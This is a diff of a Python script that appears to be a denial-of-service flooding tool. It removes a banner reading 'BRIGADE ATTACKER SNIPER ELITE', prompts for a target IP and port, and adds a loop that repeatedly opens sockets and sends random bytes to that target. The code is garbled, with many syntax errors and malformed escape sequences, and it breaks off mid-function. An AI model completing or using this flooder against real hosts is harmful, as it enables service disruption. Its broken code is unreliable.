@@ -15,43 +15,68 @@ day = now.day
 month = now.month
 year = now.year
 
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    ZA1 = '\033[31m'
+    ZA2 = '\033[32m'
+    ZA3 = '\033[33m'
+    FAIL = '\033[91m'
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    ZH = '\033[97m'
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-bytes = random._urandom(1490)
-
-
+# CLEAR
 os.system("clear")
-print("""\033[1;31m \033[[92m 
-       ® ®    ® ® ® ®    ® ®
-     ®     ®        ®  ®     ®
-     ®     ®        ®  ®     ®
-     ®     ®  ®     ®  ®     ®
-       ® ®      ® ®      ® ®
-
-     ®    ®  ® ® ®   ® ® ®   ®     ®   ® ® ®  ®     ®
-     ®  ®    ®      ®        ®     ®  ®       ®     ®
-     ® ®     ® ®     ® ® ®   ®     ®   ® ® ®  ®     ®
-     ®  ®    ®            ®  ®     ®        ® ®     ®
-     ®    ®  ® ® ®   ® ® ®     ® ®     ® ® ®    ® ®
-______________________________________By: SanAhmad_________
-[[ B R I G A D E  A T T A C K E R  S N I P E R  E L I T E ]]                                                       
-[[           I N T E R N A L  S C R I P T                 ]]
-[[________________________________________________________]]
-""")
-
+print("")
+print("\033[   \033[0m")
+print("\033[   \033[0m")
+print("\033[   \033[0m")
+print("\033[   \033[0m")
+print("\033[   \033[0m")
+print("\033[   \033[0m")
+print("\033[   \033[0m")
+print("\033[   \033[0m")
+print("\033[   \033[0m")
+print("\033[   \033[0m")
+print("\033[   \033[0m")
+print("\033[   \033[0m")
+print("\033[   \033[0m")
+print("\033[   \033[0m")
 print(" ")
-ip = raw_input("033[94m[*] \033[91mIP 033[91mTarget \033[97m>>> \033[93m ")
-port = input("\033[94m[*] \033[91mPort \033[97m>>> \033[93m  ")
+ip = str_input("033[94m[\033[0m" "\033[1m*\033\0m" "\033[94m]\033[0m" "\033[91mIP Target \033[0m ")
+print("\033[97m⁵⁵⁵>\033\0m")
+port = int(input("033[94m[\033[0m" "\033[1m*\033\0m" "\033[94m]\033[0m" "\033[91mPort \033[0m ")
+print("\033[97m⁵⁵⁵>\033\0m")
+packs =
+print("\033[97m⁵⁵⁵>\033\0m")
 
+print("\033[97m⁵⁵⁵>\033\0m")
 
 def animated_marker();
     widgets = [FormatLabel('Animated Bouncer: value %(value)d - '),
                BouncingBar(marker=RotatingMarker())]
 
-    pbar = ProgressBar(widgets=widgets)
+    pbar = ProgressBar(widgets=widgets).start()
     for i in pbar((i for i in range(180))):
         time.sleep(0.05)
         bar.update(i)
+
+
+animated_marker()
+
+def start():
+   r = random_urandom(10)
+   u = int((0)
+   while True
+       try:
+         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+         s.connect((ip,port))
+         s.send(r)
 
 
 
